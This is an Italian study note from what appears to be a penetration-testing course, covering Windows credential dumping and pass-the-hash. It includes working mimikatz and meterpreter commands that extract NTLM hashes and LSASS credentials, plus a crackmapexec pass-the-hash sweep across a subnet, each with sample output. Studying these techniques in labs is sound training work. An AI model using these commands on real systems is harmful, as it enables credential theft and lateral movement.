# Credential Dumping con Mimikatz

**Difficolta:** Advanced
**Time to Master:** 2h
**Prerequisiti:** [01-Windows-Host-Attacks.md](01-Windows-Host-Attacks.md)
**Lab:** INE PTS labs (rete Windows con accesso amministrativo gia ottenuto)

---

## Obiettivo

Capire come vengono estratte le credenziali da un host Windows gia compromesso (SAM locale, memoria LSASS) e come riutilizzarle per muoversi lateralmente, come ponte concettuale verso la post-exploitation.

---

## Concetti chiave

### Dove vivono le credenziali su Windows

| Fonte | Cosa contiene | Richiede |
|-------|-----------------|----------|
| SAM (Security Account Manager) | hash NTLM degli utenti locali | accesso amministrativo locale |
| LSASS (memoria di processo) | credenziali in chiaro/hash di sessioni attive (incl. utenti di dominio) | privilegi SYSTEM/debug |
| NTDS.dit | database utenti dell'intero dominio Active Directory | accesso al Domain Controller |

**Importante:** il credential dumping richiede SEMPRE privilegi elevati gia ottenuti (admin locale o SYSTEM) — non e una tecnica di accesso iniziale, ma di post-exploitation, ed e per questo che va studiata dopo aver capito come ottenere un primo shell (vedi [01-Windows-Host-Attacks.md](01-Windows-Host-Attacks.md)).

### Pass-the-Hash (PtH) — concetto

Windows autentica spesso usando l'hash NTLM stesso (non la password in chiaro): se si ottiene l'hash di un utente, lo si puo usare direttamente per autenticarsi su altri sistemi della rete, senza mai conoscere la password reale. E una delle tecniche di lateral movement piu comuni in ambienti Windows/AD.

---

## Strumenti

| Tool | Comando base | Output | Note |
|------|---------------|--------|------|
| mimikatz | `privilege::debug` poi `sekurlsa::logonpasswords` | credenziali in memoria | richiede SYSTEM o debug privilege |
| mimikatz (SAM) | `lsadump::sam` | hash NTLM utenti locali | richiede accesso al registro SAM |
| Meterpreter | `hashdump` (post ottenuto SYSTEM) | hash NTLM utenti locali | integrato in Metasploit, non richiede mimikatz separato |
| crackmapexec/netexec | `nxc smb target -u user -H <NTLM-hash>` | verifica pass-the-hash | testa l'hash su tutta la rete |

---

## Payload / Esempi

### Esempio 1: dump SAM da meterpreter (dopo aver ottenuto SYSTEM)

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > hashdump
```

**Output atteso:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

**Spiegazione:** con privilegi SYSTEM, `hashdump` legge direttamente il database SAM e restituisce username:RID:hash-LM:hash-NTLM. Il primo hash (LM) su sistemi moderni e sempre il valore vuoto standard; il secondo (NTLM) e quello utile per cracking o pass-the-hash.

### Esempio 2: mimikatz da shell diretta sull'host

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

**Output atteso:**
```
Authentication Id : 0 ; 123456
User Name         : jsmith
Domain            : CORP
NTLM              : a1b2c3d4e5f6...
```

**Spiegazione:** `sekurlsa::logonpasswords` legge la memoria del processo LSASS e mostra le credenziali (talvolta anche in chiaro, se l'host non ha WDigest disabilitato) di ogni sessione attiva sull'host, incluse quelle di utenti di dominio che si sono autenticati localmente.

### Esempio 3: riutilizzo dell'hash con pass-the-hash

```bash
crackmapexec smb 10.10.10.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

**Spiegazione:** l'hash NTLM ottenuto viene testato direttamente su tutta la subnet senza mai craccarlo; se l'hash e riutilizzato su altri host (comune quando l'admin locale ha la stessa password ovunque), si ottiene accesso immediato senza bisogno di password in chiaro.

---

## Lab Hands-On

### Lab 1: INE PTS — Windows post-exploitation lab
**Obiettivo:** dopo aver ottenuto SYSTEM su un host Windows, estrarre e riutilizzare credenziali su altri host della rete
**Difficulty:** Intermedio
**Time:** 1h

**Walkthrough breve:**
1. Ottieni una sessione meterpreter con privilegi SYSTEM (vedi privilege escalation)
2. Esegui `hashdump` o mimikatz per estrarre gli hash
3. Testa gli hash trovati su altri host della rete con crackmapexec/netexec

---

## Common Mistakes

- Provare a dumpare credenziali senza aver prima verificato i privilegi (`getuid`/`whoami`) -> fallisce silenziosamente o con errore di accesso negato
- Craccare l'hash NTLM quando basterebbe il pass-the-hash diretto -> perdita di tempo inutile
- Non testare gli hash trovati su TUTTA la rete raggiungibile -> si perde spesso l'opportunita di lateral movement piu rapida del lab

---

## Link Utili

- [Mimikatz — GitHub](https://github.com/gentilkiwi/mimikatz)
- [Pass-the-Hash — MITRE ATT&CK T1550.002](https://attack.mitre.org/techniques/T1550/002/)

---

## Connessioni

- **Prerequisito:** [01-Windows-Host-Attacks.md](01-Windows-Host-Attacks.md)
- **Prossimo Step:** [Lab-Challenges.md](Lab-Challenges.md)
- **Combinazione con:** [../08-Exploitation-PostEx/03-Privilege-Escalation-Windows.md](../08-Exploitation-PostEx/03-Privilege-Escalation-Windows.md)

---

## Checklist di padronanza

- [ ] Capisco perche il credential dumping richiede privilegi gia elevati
- [ ] So estrarre hash SAM con meterpreter o mimikatz
- [ ] So spiegare il concetto di pass-the-hash
- [ ] So testare un hash trovato su piu host della rete

---

## Note personali

_(spazio libero)_
